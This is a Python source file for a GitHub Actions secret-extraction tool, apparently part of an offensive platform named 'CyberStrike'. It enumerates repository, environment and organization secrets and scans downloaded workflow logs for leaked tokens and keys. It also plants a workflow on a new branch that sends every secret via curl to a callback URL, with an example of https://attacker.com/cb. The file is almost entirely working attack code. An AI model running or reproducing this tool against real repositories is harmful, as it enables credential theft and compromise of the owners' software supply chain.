#!/usr/bin/env python3
"""
gh_secrets.py — GitHub Actions Secret Extraction

Enumerates repository and environment secrets, searches workflow logs for
leaked credentials, and uses workflow dispatch for secret exfiltration.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

GH_API = "https://api.github.com"
STATE_FILE = str(Path.home() / ".cyberstrike" / "cipipe-state.json")


def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"created_resources": []}


def save_state(state):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2, default=str)


class GhSecrets:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.token = args.token or os.environ.get("GITHUB_TOKEN", "")
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — GitHub Secrets Extraction")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Repo:      {self.args.repo}")
        print(f"Method:    {self.args.method}")
        print(f"Token:     {'set' if self.token else 'NOT SET'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<14}] [{status.upper():<8}] {detail}", flush=True)

    def headers(self):
        h = {"Accept": "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28"}
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        return h

    def track_resource(self, resource_type, resource_id, **extra):
        entry = {"type": resource_type, "id": resource_id, "created_at": datetime.now().isoformat()}
        entry.update(extra)
        self.state["created_resources"].append(entry)
        save_state(self.state)

    def method_list(self):
        repo = self.args.repo
        r = requests.get(f"{GH_API}/repos/{repo}/actions/secrets", headers=self.headers(), timeout=30)
        if r.status_code == 200:
            secrets = r.json().get("secrets", [])
            for secret in secrets:
                self.emit({
                    "action": "secret",
                    "status": "found",
                    "detail": f"{secret['name']} (updated: {secret.get('updated_at', 'N/A')})",
                    "name": secret["name"],
                    "created_at": secret.get("created_at"),
                    "updated_at": secret.get("updated_at"),
                    "scope": "repository",
                })
        else:
            self.emit({"action": "list", "status": "failed", "detail": f"HTTP {r.status_code}: {r.text[:200]}"})

        env_r = requests.get(f"{GH_API}/repos/{repo}/environments", headers=self.headers(), timeout=30)
        if env_r.status_code == 200:
            for env in env_r.json().get("environments", []):
                env_name = env["name"]
                env_secrets_r = requests.get(f"{GH_API}/repos/{repo}/environments/{env_name}/secrets", headers=self.headers(), timeout=30)
                if env_secrets_r.status_code == 200:
                    for secret in env_secrets_r.json().get("secrets", []):
                        self.emit({
                            "action": "secret",
                            "status": "found",
                            "detail": f"{secret['name']} (env: {env_name})",
                            "name": secret["name"],
                            "environment": env_name,
                            "created_at": secret.get("created_at"),
                            "updated_at": secret.get("updated_at"),
                            "scope": "environment",
                        })

        org_r = requests.get(f"{GH_API}/repos/{repo}/actions/organization-secrets", headers=self.headers(), timeout=30)
        if org_r.status_code == 200:
            for secret in org_r.json().get("secrets", []):
                self.emit({
                    "action": "secret",
                    "status": "found",
                    "detail": f"{secret['name']} (org)",
                    "name": secret["name"],
                    "scope": "organization",
                })

    def method_logs(self):
        repo = self.args.repo
        r = requests.get(f"{GH_API}/repos/{repo}/actions/runs", headers=self.headers(), params={"per_page": 20}, timeout=30)
        if r.status_code != 200:
            self.emit({"action": "logs", "status": "failed", "detail": f"HTTP {r.status_code}"})
            return

        import re
        secret_patterns = [
            re.compile(r"(AKIA[A-Z0-9]{16})", re.IGNORECASE),
            re.compile(r"(ghp_[A-Za-z0-9]{36})", re.IGNORECASE),
            re.compile(r"(gho_[A-Za-z0-9]{36})", re.IGNORECASE),
            re.compile(r"(sk-[A-Za-z0-9]{32,})", re.IGNORECASE),
            re.compile(r"(-----BEGIN (?:RSA )?PRIVATE KEY-----)", re.IGNORECASE),
            re.compile(r"password[=:]\s*\S+", re.IGNORECASE),
            re.compile(r"token[=:]\s*\S+", re.IGNORECASE),
        ]

        for run in r.json().get("workflow_runs", []):
            if not self.running:
                break
            run_id = run["id"]
            logs_r = requests.get(f"{GH_API}/repos/{repo}/actions/runs/{run_id}/logs", headers=self.headers(), timeout=60, allow_redirects=True)
            if logs_r.status_code != 200:
                continue

            import io
            import zipfile
            try:
                zf = zipfile.ZipFile(io.BytesIO(logs_r.content))
                for name in zf.namelist():
                    if not self.running:
                        break
                    content = zf.read(name).decode("utf-8", errors="replace")
                    for pattern in secret_patterns:
                        for match in pattern.finditer(content):
                            self.emit({
                                "action": "leak",
                                "status": "found",
                                "detail": f"Run {run_id} / {name}: {match.group()[:50]}",
                                "run_id": run_id,
                                "log_file": name,
                                "matched": match.group()[:100],
                                "pattern": pattern.pattern,
                            })
            except (zipfile.BadZipFile, Exception):
                continue

    def method_dispatch(self):
        repo = self.args.repo
        callback_url = self.args.callback_url
        if not callback_url:
            self.emit({"action": "dispatch", "status": "failed", "detail": "--callback-url required for dispatch method"})
            return

        workflow_content = f"""name: cs-exfil
on:
  workflow_dispatch:
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: extract
        env:
          ALL_SECRETS: ${{{{ toJSON(secrets) }}}}
        run: |
          curl -s -X POST "{callback_url}" \\
            -H "Content-Type: application/json" \\
            -d "${{ALL_SECRETS}}"
"""
        branch = f"cs-exfil-{int(time.time())}"
        ref_r = requests.get(f"{GH_API}/repos/{repo}/git/ref/heads/main", headers=self.headers(), timeout=30)
        if ref_r.status_code != 200:
            ref_r = requests.get(f"{GH_API}/repos/{repo}/git/ref/heads/master", headers=self.headers(), timeout=30)
        if ref_r.status_code != 200:
            self.emit({"action": "dispatch", "status": "failed", "detail": "Cannot get default branch ref"})
            return

        sha = ref_r.json()["object"]["sha"]

        br_r = requests.post(f"{GH_API}/repos/{repo}/git/refs", headers=self.headers(), json={"ref": f"refs/heads/{branch}", "sha": sha}, timeout=30)
        if br_r.status_code not in (200, 201):
            self.emit({"action": "dispatch", "status": "failed", "detail": f"Create branch: HTTP {br_r.status_code}"})
            return
        self.track_resource("branch", branch, repo=repo)

        import base64
        file_body = {
            "message": "Add workflow",
            "content": base64.b64encode(workflow_content.encode()).decode(),
            "branch": branch,
        }
        file_r = requests.put(f"{GH_API}/repos/{repo}/contents/.github/workflows/cs-exfil.yml", headers=self.headers(), json=file_body, timeout=30)
        if file_r.status_code not in (200, 201):
            self.emit({"action": "dispatch", "status": "failed", "detail": f"Create workflow file: HTTP {file_r.status_code}"})
            return
        self.track_resource("workflow_file", ".github/workflows/cs-exfil.yml", repo=repo, branch=branch)

        dispatch_r = requests.post(
            f"{GH_API}/repos/{repo}/actions/workflows/cs-exfil.yml/dispatches",
            headers=self.headers(),
            json={"ref": branch},
            timeout=30,
        )
        if dispatch_r.status_code == 204:
            self.emit({"action": "dispatch", "status": "success", "detail": f"Workflow dispatched on branch {branch}"})
        else:
            self.emit({"action": "dispatch", "status": "failed", "detail": f"Dispatch: HTTP {dispatch_r.status_code}"})

    def run(self):
        self.print_banner()

        if not self.token:
            print("ERROR: GitHub token required. Set --token or GITHUB_TOKEN.", file=sys.stderr)
            sys.exit(1)

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        methods = {
            "list": self.method_list,
            "logs": self.method_logs,
            "dispatch": self.method_dispatch,
        }

        method_fn = methods.get(self.args.method)
        if not method_fn:
            print(f"ERROR: Unknown method '{self.args.method}'. Available: {', '.join(methods.keys())}", file=sys.stderr)
            sys.exit(1)

        method_fn()
        self.cleanup()

    def cleanup(self):
        print(f"\n--- gh_secrets summary ---")
        print(f"Method: {self.args.method}")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract GitHub Actions secrets via enumeration, log search, or workflow dispatch.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 gh_secrets.py --repo OWNER/REPO --method list\n"
            "  python3 gh_secrets.py --repo OWNER/REPO --method logs --json-output\n"
            "  python3 gh_secrets.py --repo OWNER/REPO --method dispatch --callback-url https://attacker.com/cb\n"
        ),
    )
    parser.add_argument("--repo", type=str, required=True, help="GitHub repository (OWNER/REPO)")
    parser.add_argument("--method", type=str, default="list", help="Method: list|logs|dispatch")
    parser.add_argument("--callback-url", type=str, default=None, help="Callback URL for dispatch method")
    parser.add_argument("--token", type=str, default=None, help="GitHub personal access token")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    tool = GhSecrets(args)
    tool.run()


if __name__ == "__main__":
    main()
